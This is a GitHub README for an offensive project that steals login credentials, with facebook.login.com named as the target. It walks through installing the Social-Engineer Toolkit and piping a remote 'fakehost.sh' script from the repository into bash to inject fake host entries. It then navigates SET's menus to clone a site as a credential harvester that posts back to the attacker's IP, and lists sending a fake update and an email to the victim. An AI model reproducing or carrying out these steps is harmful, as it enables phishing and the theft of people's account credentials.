# WARNING: This is a development project and is not READY for USING ;)
- BR
------------------------------------------------------------------------------------------
# SSTC-HTTPS-hijack-login-credentials 
- by nu11secur1ty

![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/https_image-620x499.jpg)


1. - Installing requirements
     https://github.com/trustedsec/social-engineer-toolkit

2. - Preparing packages
For other Linux distro attackers
```
$ git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
$ cd set
$ pip install -r requirements.txt
```
// For kali 
```bash 
setoolkit
```
# Exploit steps:

1. - Creating hosts exploit facebook.login.com
```bash
curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/hosts_fake_inject/fakehost.sh | bash
```

2. - setoolkit
```bash
setoolkit
1) Social-Engineering Attacks
     set>1
     enter
2) Website Attack Vectors
     set>2
     enter
3) Credential Harvester Attack Method
     set:webattack>3
     enter
2) Site Cloner
     set:webattack>2
     enter
set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.10.100]:_your_local_layer2_IP_
     enter
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: _your_site_
     enter
     enter
```
3. - Fake update for victim
4. - send email





